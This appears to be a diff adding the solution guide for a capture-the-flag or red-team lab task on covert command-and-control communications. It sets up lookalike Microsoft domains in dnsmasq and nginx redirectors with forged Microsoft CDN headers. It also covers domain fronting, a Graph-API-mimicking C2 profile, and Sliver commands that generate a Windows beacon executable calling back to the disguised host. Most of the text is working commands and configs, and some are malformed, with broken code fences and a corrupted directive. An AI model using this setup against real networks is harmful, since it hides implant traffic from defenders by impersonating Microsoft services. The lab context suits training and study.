@@ -1,0 +1,403 @@
+
+
+# TASK 2 — Establish Covert Communications
+
+
+---
+
+
+## Step D1 — Cover Story 
+
+
+**VMs:** VM2 (Ubuntu) — dnsmasq zone config. VM1, VM2, VM3 — point DNS to `192.168.56.20` (resolver / `Set-DnsClientServerAddress` on Windows).
+
+
+### Solution
+
+
+**Run on — VM2 (Ubuntu):**
+```bash
+# On Ubuntu (dnsmasq is pre-installed)
+sudo tee /etc/dnsmasq.d/ctf-domains.conf << 'EOF'
+listen-address=192.168.56.20
+bind-interfaces
+no-resolv
+server=8.8.8.8
+
+
+address=/update-microsoft.com/192.168.56.20
+address=/api.office365-verify.com/192.168.56.20
+address=/telemetry-windows.net/192.168.56.20
+
+
+mx-host=update-microsoft.com,mail.update-microsoft.com,10
+txt-record=update-microsoft.com,"v=spf1 include:spf.protection.outlook.com -all"
+EOF
+
+
+sudo systemctl restart dnsmasq
+```
+
+
+**Run on — all VMs** — Linux (**VM1** Kali + **VM2** Ubuntu): resolver snippet (repeat on each; use NetworkManager if preferred):
+
+
+```bash
+# Ubuntu/Kali: add to /etc/resolv.conf or configure NetworkManager
+echo "nameserver 192.168.56.20" | sudo tee /etc/resolv.conf
+```
+
+
+**Run on — VM3 (Windows):**
+
+
+```powershell
+# Windows (PowerShell as Administrator)
+Set-DnsClientServerAddress -InterfaceAlias "Ethernet 2" -ServerAddresses "192.168.56.20"
+```
+
+
+**Run on — VM1 (Kali)** (or any VM with `dig` pointed at VM2):
+
+
+```bash
+dig @192.168.56.20 update-microsoft.com
+dig @192.168.56.20 api.office365-verify.com
+dig @192.168.56.20 update-microsoft.com MX
+dig @192.168.56.20 update-microsoft.com TXT
+```
+
+
+### Expected output (reference)
+
+
+**`dig @192.168.56.20 update-microsoft.com +short`:**
+**`dig @192.168.56.20 api.office365-verify.com +short`:**`
+**`dig @192.168.56.20 update-microsoft.com MX +short` (example):**
+**`dig @192.168.56.20 update-microsoft.com TXT +short` (example):**
+
+
+**`systemctl status dnsmasq` (excerpt):**
+
+
+
+
+
+
+
+## Step D1
+
+sudo pkill -9 socat 2>/dev/null || true
+sleep 1
+sudo rm -f /etc/nginx/sites-enabled/c2-edge /etc/nginx/sites-enabled/c2-internal
+
+
+
+# D2 vhost (nginx TLS on 443; Sliver HTTP on 127.0.0.1:8443)
+
+sudo tee /etc/nginx/sites-available/d2-cdn >/dev/null <<'EOF'
+server {
+    listen 443 ssl default_server;
+    server_name update-microsoft.com 127.0.0.1 localhost;
+
+    ssl_certificate /home/sliver-op/certs/server.crt;
+    ssl_certificate_key /home/sliver-op/certs/server.key;
+
+    server_tokens off;
+    more_clear_headers Server;
+    more_clear_headers X-Powered-By;
+
+    add_header X-CDN-Node "edge-wus2-01";
+    add_header X-Cache "HIT";
+    add_header X-Cache-Status "DYNAMIC";
+    add_header X-Azure-Ref "0abc123def456";
+    add_header X-MSEdge-Ref "Ref A: abc123 Ref B: SEA30EDGE0412";
+
+    location /beacon {
+        proxy_pass http://127.0.0.1:8443;
+        proxy_set_header Host $host;
+        proxy_set_header X-Real-IP $remote_addr;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+    }
+
+    location / {
+        default_type application/json;
+        return 200 '{"status":"ok","service":"Microsoft Update","version":"2.0"}';
+    }
+}
+EOF
+
+sudo ln -sf /etc/nginx/sites-available/d2-cdn /etc/nginx/sites-enabled/d2-cdn
+sudo nginx -t && sudo systemctl restart nginx
+```
+
+**Sliver (VM2, `sliver-client` → teamserver):** remove any **https** listener on **9443** if it still grabs traffic you do not want (`jobs` → **`jobs -k <id>`**).
+
+```
+http --lhost 127.0.0.1 --lport 8443
+```
+
+# 4) Verify (VM2) — :443 must be nginx; :8443 must be sliver-server (HTTP C2)
+
+sudo ss -tlnp | grep -E ':443|:8443'
+curl -ksI https://127.0.0.1 | head -20
+```
+
+
+**Kali:**
+
+```bash
+curl -kI https://192.168.56.20
+curl -kI https://update-microsoft.com
+```
+
+
+nmap -sV 192.168.56.20 -p 8443
+
+
+
+If **`nginx -t`** complains about **duplicate `default_server`**, remove **`default_server`** from any other **`listen 443 ssl`** site under **`/etc/nginx/sites-enabled/`**.
+
+
+## Step D3 — Domain Fronting (200 pts)
+
+
+**VMs:** VM2 (Ubuntu) — nginx SSL `server_name` / routing. VM1 (Kali) — `curl --resolve`, Wireshark / `tshark`.
+
+
+### Solution
+
+
+**VM2 (Ubuntu) — command sequence**
+
+
+```bash
+export FRONT=front-domain.com
+export C2HOST=update-microsoft.com
+sudo openssl x509 -in /home/sliver-op/certs/server.crt -noout -text | grep -E 'Subject:|DNS:'
+sudo nano /etc/nginx/sites-available/d3-fronting
+
+```
+nginx
+# Nginx config handling both front and real domains
+# TLS: SNI must match one of server_name. HTTP: Host selects /beacon backend vs decoy.
+server {
+    listen 443 ssl;
+    server_name front-domain.com update-microsoft.com;
+
+    ssl_certificate     /home/sliver-op/certs/server.crt;
+    ssl_certificate_key /home/sliver-op/certs/server.key;
+
+    location /beacon {
+        if ($http_host != "update-microsoft.com") {
+            return 200 '{"status":"cover-beacon"}';
+        }
+        proxy_pass http://127.0.0.1:8443;
+        proxy_set_header Host $host;
+        proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for;
+        proxy_set_header X-Real-IP $remote_addr;
+    }
+
+    location / {
+        return 200 '<html><body><h1>Welcome</h1></body></html>';
+        add_header Content-Type text/html;
+    }
+}
+
+```
+
+
+```bash
+sudo ln -sf /etc/nginx/sites-available/d3-fronting /etc/nginx/sites-enabled/d3-fronting
+sudo nginx -t && sudo systemctl reload nginx
+```
+**VM1 (Kali): curl (decoy vs fronted)**
+
+export FRONT=front-domain.com
+export C2HOST=update-microsoft.com
+export TS=192.168.56.20
+
+# SNI = FRONT; default Host = FRONT -> decoy 200 JSON on /beacon
+curl -skI --resolve "${FRONT}:443:${TS}" "https://${FRONT}/beacon" | head -1
+
+# SNI = FRONT; Host = C2HOST -> proxy to Sliver (404/405 common for raw curl)
+curl -skw 'HTTP %{http_code}\n' -o /dev/null --resolve "${FRONT}:443:${TS}" -H "Host: ${C2HOST}" "https://${FRONT}/beacon"
+
+
+
+# SNI (run curl from Kali in a second terminal while this runs)
+IFACE=$(ip route get "${TS}" 2>/dev/null | awk '{for(i=1;i<=NF;i++) if($i=="dev"){print $(i+1); exit}}')
+echo "Using: ${IFACE:-eth1}"
+ip -br a
+
+
+Option A (live): Terminal A runs tshark; Terminal B runs curl with --resolve and Host: ${C2HOST}. tls.handshake.extensions_server_name should show front-domain.com.
+
+sudo tshark -i "${IFACE:-eth1}" -f "tcp port 443" -Y "tls.handshake.type == 1" -T fields -e tls.handshake.extensions_server_name
+
+# other terminal:
+curl -sk --resolve "${FRONT}:443:${TS}" -H "Host: ${C2HOST}" -o /dev/null "https://${FRONT}/beacon"
+
+
+Option B (pcap file): Start tshark -w first; run the same curl while capturing; stop tshark; read SNI.
+
+sudo rm -f /tmp/d3-fronting-sni.pcap
+sudo tshark -i "${IFACE:-eth1}" -f "tcp port 443 and host ${TS}" -w /tmp/d3-fronting-sni.pcap
+# second terminal: curl (same as Option A)
+sudo tshark -r /tmp/d3-fronting-sni.pcap -Y "tls.handshake.type == 1" -T fields -e tls.handshake.extensions_server_name | sort -u
+sudo chmod a+r /tmp/d3-fronting-sni.pcap
+cp /tmp/d3-fronting-sni.pcap ~/d3-fronting-sni.pcap
+
+5 — VM2 (Ubuntu): access.log (optional)
+sudo tail -n 30 /var/log/nginx/access.log | grep beacon
+
+Run wireshark 
+
+wireshark ~/d3-fronting-sni.pcap
+
+
+## Step D4 — Malleable C2 Profile (200 pts)
+
+
+**VMs:** VM2 (Ubuntu) — nginx Graph-API-style locations. VM1 (Kali) — Sliver `generate` / implant, `curl` tests.
+
+
+### Solution
+
+
+**VM2 (Ubuntu) — command sequence** *(SSH to **192.168.56.20** — not Kali; **`ssl_certificate`** paths are on VM2)*
+
+
+```bash
+# If D2 is still enabled, `location /` returns {"status":"ok","service":"Microsoft Update",...} for *every* path
+
+# (including /v1.0/me). Remove D2/D3 sites from sites-enabled so D4 is the only 443 vhost for update-microsoft.com:
+sudo rm -f /etc/nginx/sites-enabled/d2-cdn /etc/nginx/sites-enabled/d3-fronting
+
+
+sudo nano /etc/nginx/sites-available/d4-graph
+# paste full server { … } from snippet below; save
+sudo ln -sf /etc/nginx/sites-available/d4-graph /etc/nginx/sites-enabled/d4-graph
+
+# C2 endpoints disguised as Graph API
+    location /v1.0/me/drive/items {
+        proxy_pass http://127.0.0.1:8443;
+        proxy_set_heade#r Host $host;
+        proxy_hide_header Content-Type;
+        add_header Content-Type "application/json; odata.metadata=minimal" always;
+        add_header request-id "a1b2c3d4-e5f6-7890-abcd-ef1234567890" always;
+    }
+
+
+    location /v1.0/me/messages {
+        proxy_pass http://127.0.0.1:8443;
+        proxy_set_header Host $host;
+        proxy_hide_header Content-Type;
+        add_header Content-Type "application/json; odata.metadata=minimal" always;
+    }
+
+
+    # Realistic 401 for unauthenticated requests
+    location /v1.0/ {
+        return 401 '{"error":{"code":"InvalidAuthenticationToken","message":"Access token is empty.","innerError":{"date":"2026-04-02","request-id":"b2c3d4e5-f6a7-8901-bcde-f12345678901"}}}';
+        add_header Content-Type "application/json" always;
+        add_header WWW-Authenticate 'Bearer realm="", authorization_uri="https://login.microsoftonline.com/common/oauth2/authorize"' always;
+    }
+
+
+    location / {
+        return 404 '{"error":{"code":"ResourceNotFound","message":"Resource not found"}}';
+        add_header Content-Type "application/json" always;
+    }
+}
+```
+
+grep -R 'v1\.0/me' /etc/nginx/sites-enabled/
+sudo nginx -t && sudo systemctl reload nginx
+```
+
+
+```text
+jobs
+http -L 127.0.0.1 -l 8443
+```
+
+
+**VM1 (Kali) — command sequence**
+
+
+```bash
+grep -q 'update-microsoft.com' /etc/hosts || echo '192.168.56.20 update-microsoft.com' | sudo tee -a /etc/hosts
+curl -sk "https://127.0.0.1/v1.0/me" | head -c 300; echo
+curl -sk "https://update-microsoft.com/v1.0/me" | head -c 400; echo
+curl -skI "https://127.0.0.1/v1.0/me/drive/items" -H "Authorization: Bearer x" | grep -iE 'HTTP/|content-type'
+curl -sk "https://127.0.0.1/v1.0/me" | grep -o 'InvalidAuthenticationToken' | head -1
+```
+
+
+```text
+# Sliver 1.7.x has no --http-url; put the Graph path on the URL you pass to --http:
+generate beacon --http "https://update-microsoft.com/v1.0/me/drive/items" --os windows --arch amd64 --format exe --save /tmp/graph_beacon.exe
+```
+
+
+**Run on — VM2 (Ubuntu)** — nginx config snippet:
+
+
+```nginx
+# Graph API mimicking Nginx config
+server {
+    listen 443 ssl;
+    server_name graph.microsoft.com update-microsoft.com 127.0.0.1 localhost;
+
+
+    ssl_certificate /home/sliver-op/certs/server.crt;
+    ssl_certificate_key /home/sliver-op/certs/server.key;
+
+
+    
+
+**Run on — VM1 (Kali)** — Sliver **client** console:
+
+
+```
+# In Sliver console (HTTP C2: host + path in one --http URL; use generate beacon, not generate alone)
+generate beacon --http "https://update-microsoft.com/v1.0/me/drive/items" \
+    --os windows --arch amd64 --format exe --save /tmp/graph_beacon.exe
+```
+
+**Run on — VM1 (Kali):**
+```bash
+# Unauthenticated request — realistic 401
+curl -k https://update-microsoft.com/v1.0/me
+# Returns Graph API-style 401 error
+
+
+
+
+
+# Beacon path — forwards to C2
+curl -k -H "Authorization: Bearer fake_token" \
+    https://update-microsoft.com/v1.0/me/drive/items
+```
+
+
+### Expected output (reference)
+
+
+**`curl -sk https://update-microsoft.com/v1.0/me` (resolve to VM2):** `HTTP/1.1 401` and JSON body containing e.g.:
+```text
+InvalidAuthenticationToken
+Access token is empty
+```
+and header `WWW-Authenticate: Bearer ...`
+
+
+**`curl -skI https://update-microsoft.com/v1.0/me/drive/items -H "Authorization: Bearer fake_token"`:**  
+`Content-Type: application/json; odata.metadata=minimal` (or similar) and optional `request-id:` header — body may be empty or C2-specific if proxied to Sliver.
+
+
+
+
+
+
